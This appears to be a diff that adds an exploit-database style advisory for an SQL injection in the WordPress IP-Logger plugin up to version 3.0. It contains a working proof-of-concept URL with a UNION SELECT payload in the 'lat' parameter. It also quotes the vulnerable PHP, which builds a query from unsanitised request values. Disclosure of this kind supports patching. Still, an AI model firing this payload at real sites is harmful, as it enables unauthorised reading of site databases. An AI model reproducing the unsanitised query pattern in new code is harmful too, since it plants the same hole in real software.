@@ -1,0 +1,23 @@
+# Exploit Title: WordPress IP-Logger plugin <= 3.0 SQL Injection Vulnerability
+# Date: 2011-08-16
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/ip-logger.3.0.zip
+# Version: 3.0 (tested)
+
+---
+PoC
+---
+http://www.site.com/wp-content/plugins/ip-logger/map-details.php?lat=-1 UNION ALL SELECT @@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20&lon=-1&blocked=-1
+
+---------------
+Vulnerable code
+---------------
+$sql = sprintf("select stamp,ip_v4,url,user_agent,Provider,Code3,Country,Blocked,Ignored from $table_name 
+  where Latitude=%s and Longitude=%s and Blocked = '%s'
+  order by stamp asc limit 50",
+  $_REQUEST["lat"],
+  $_REQUEST["lon"],
+  $_REQUEST["blocked"]);
+
+$res = mysql_query($sql);
+
